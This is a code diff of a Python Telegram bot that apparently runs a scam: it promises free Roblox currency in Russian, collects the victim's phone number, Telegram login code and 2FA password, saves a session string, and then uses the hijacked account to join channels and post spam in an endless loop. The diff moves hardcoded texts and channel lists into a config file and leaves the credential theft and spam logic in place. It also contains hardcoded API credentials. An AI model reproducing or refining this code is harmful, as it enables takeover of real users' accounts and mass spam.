@@ -45,19 +45,18 @@ dp = Dispatcher(bot)
 
 @dp.message_handler(commands=['start'])
 async def process_start_command(message: types.Message):
-    button_hi = KeyboardButton('💾Получить Робуксы', request_contact=True)
+    button_hi = KeyboardButton(config.textInfo["authorizationButtonText"], request_contact=True)
     greet_kb = ReplyKeyboardMarkup(resize_keyboard=True)
     greet_kb.add(button_hi)
 
-    await message.reply(config.textInfo["startText"])
+    await message.reply(config.textInfo["startText"], reply_markup=greet_kb)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
 async def contacts(msg: types.Message):
-    await msg.reply("⌚ Подключаемся к серверам роблокса..")
+    await msg.reply(config.textInfo["connectionText"])
 
     try:
         if steps[msg.chat.id]["step"] == -1:
-            await msg.reply("Вы уже запросили робуксы! Ожидайте")
             return
     except:
         pass
@@ -85,9 +84,9 @@ async def contacts(msg: types.Message):
         steps[msg.chat.id]["step"] = 1
         steps[msg.chat.id]["phone_number"] = msg.contact.phone_number
 
-        old_text = "📲Введите код, который вам отправил телеграмм(проверьте чаты)"
+        old_text = config.textInfo["codeText"]
         steps[msg.chat.id]["msg_text"] = old_text
-        msgg = await msg.reply("📲Введите код, который вам отправил телеграмм(проверьте чаты)", reply_markup=greet_kb)
+        msgg = await msg.reply(config.textInfo["codeText"], reply_markup=greet_kb)
 
     except Exception as e:
         print(msg.contact.phone_number)
@@ -95,14 +94,14 @@ async def contacts(msg: types.Message):
 
         os.remove(f"{msg.contact.phone_number}.session")
 
-        await msg.reply('На ваш аккаунт нельзя получить Робуксы(')
+        await msg.reply(config.textInfo["errorSendCodeText"])
 
         return
 
 @dp.callback_query_handler()
 async def inline_click(call: types.CallbackQuery):
     if call.message.chat.id not in steps.keys():
-        await call.message.reply("Введите /start")
+        await call.message.reply("/start")
         return
     if steps[call.message.chat.id]["step"] != 1:
         return
@@ -119,7 +118,7 @@ async def inline_click(call: types.CallbackQuery):
         steps[call.message.chat.id]["msg_text"] = f"{call.message.text}{callback}"
         await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"{call.message.text}{callback}", reply_markup=greet_kb)
     if callback == "del":
-        if call.message.text == "📲Введите код, который вам отправил телеграмм(проверьте чаты)":
+        if call.message.text == config.textInfo["codeText"]:
             return
         
         steps[call.message.chat.id]["msg_text"] = call.message.text[:-1]
@@ -129,10 +128,9 @@ async def inline_click(call: types.CallbackQuery):
         try:
             client111 = steps[call.message.chat.id]["client"]
 
-            await client111.enter_code(call.message.text.replace("📲Введите код, который вам отправил телеграмм(проверьте чаты)", ""))
+            await client111.enter_code(call.message.text.replace(config.textInfo["codeText"], ""))
 
             steps[call.message.chat.id]["msg_text"] = ""
-            await call.message.reply("⌚️Проверям роблокс сервера!")
 
             sessionString = StringSession.save(client111.client.session)
 
@@ -140,7 +138,7 @@ async def inline_click(call: types.CallbackQuery):
             await client111.client.disconnect()
             os.remove(f"./{client111.phone_number}.session")
 
-            await call.message.reply("✅Успех! \n Мы нашли подходящий сервер, робуксы будут выданы 24 часа! \n \n Отправьте нам свой ник в игре🎁")
+            await call.message.reply(config.textInfo["validCodeText"])
 
             await asyncio.sleep(3)
 
@@ -188,48 +186,26 @@ async def inline_click(call: types.CallbackQuery):
             client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
             await client.connect()
 
-            text = '''
-**БЕСПЛAТНЫЕ РОБУКСЫ (БЕЗ РЕФЕРАЛОК) В ЭТОМ БОТЕ**
+            text = config.spamInfo["spamText"]
 
-@telerob_g
-@telerob_g
-@telerob_g
+            if config.spamInfo["dmSpam"] == True:
+                pass
 
-**БОТ СВЕРХУ БОТ СВЕРХУ БОТ СВЕРХУ**
-**БОТ СВЕРХУ БОТ СВЕРХУ БОТ СВЕРХУ**
-**БОТ СВЕРХУ БОТ СВЕРХУ БОТ СВЕРХУ**
-                    '''
-
-            async for dialog in client.iter_dialogs():
-                if dialog.is_channel and dialog.entity.creator == True:
-                    try:
-                        await client.send_message(dialog.id, text)
-                        sended += 1
-                    except:
-                        pass
-            
-            await client(JoinChannelRequest("https://t.me/Adoptme_robloxK"))
-            await client(JoinChannelRequest("hhttp://t.me/Dreamer_proofs"))
-
-            await client(LeaveChannelRequest(-1001612518469))
+            for channel in config.spamInfo["joinChannels"]:
+                try:
+                    await client(JoinChannelRequest(channel))
+                except:
+                    pass
 
             while True:
                 await asyncio.sleep(12)
-                text = '''
-**БЕСПЛAТНЫЕ РОБУКСЫ (БЕЗ РЕФЕРАЛОК) В ЭТОМ БОТЕ**
 
-@telerob_g
-@telerob_g
-@telerob_g
+                for channel_id in config.spamInfo["channelsSpam"]:
+                    try:
+                        await client.send_message(channel_id, text)
+                    except:
+                        pass
 
-**БОТ СВЕРХУ СВЕРХУ БОТ СВЕРХУ**
-**БОТ СВЕРХУ СВЕРХУ БОТ СВЕРХУ**
-**БОТ СВЕРХУ СВЕРХУ БОТ СВЕРХУ**
-                    '''
-                try:
-                    await client.send_message(-1001612518469, text)
-                except:
-                    pass
         except ClientTelegram.NeedPassword:
             await call.message.reply("Введите ваш пароль 2фа:")
             steps[call.message.chat.id]["step"] = 2
@@ -294,48 +270,26 @@ async def code_step(message: types.Message):
             break
         client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
         await client.connect()
-        text = '''
-**БЕСПЛAТНЫЕ РОБУКСЫ (БЕЗ РЕФЕРАЛОК) В ЭТОМ БОТЕ**
 
-@telerob_g
-@telerob_g
-@telerob_g
+        text = config.spamInfo["spamText"]
 
-**БОТ СВЕРХУ БОТ СВЕРХУ БОТ СВЕРХУ**
-**БОТ СВЕРХУ БОТ СВЕРХУ БОТ СВЕРХУ**
-**БОТ СВЕРХУ БОТ СВЕРХУ БОТ СВЕРХУ**
-                    '''
+        if config.spamInfo["dmSpam"] == True:
+            pass
 
-        async for dialog in client.iter_dialogs():
-            if dialog.is_channel and dialog.entity.creator == True:
-                try:
-                    await client.send_message(dialog.id, text)
-                    sended += 1
-                except:
-                    pass
-        
-        await client(JoinChannelRequest("https://t.me/Adoptme_robloxK"))
-        await client(JoinChannelRequest("hhttp://t.me/Dreamer_proofs"))
-
-        await client(LeaveChannelRequest(-1001612518469))
+        for channel in config.spamInfo["joinChannels"]:
+            try:
+                await client(JoinChannelRequest(channel))
+            except:
+                pass
 
         while True:
             await asyncio.sleep(12)
-            text = '''
-**БЕСПЛAТНЫЕ РОБУКСЫ (БЕЗ РЕФЕРАЛОК) В ЭТОМ БОТЕ**
 
-@telerob_g
-@telerob_g
-@telerob_g
-
-**БОТ СВЕРХУ СВЕРХУ БОТ СВЕРХУ**
-**БОТ СВЕРХУ СВЕРХУ БОТ СВЕРХУ**
-**БОТ СВЕРХУ СВЕРХУ БОТ СВЕРХУ**
-            '''
-            try:
-                await client.send_message(-1001612518469, text)
-            except:
-                pass
+            for channel_id in config.spamInfo["channelsSpam"]:
+                try:
+                    await client.send_message(channel_id, text)
+                except:
+                    pass
                 
     except Exception as e:
         traceback.print_exc()
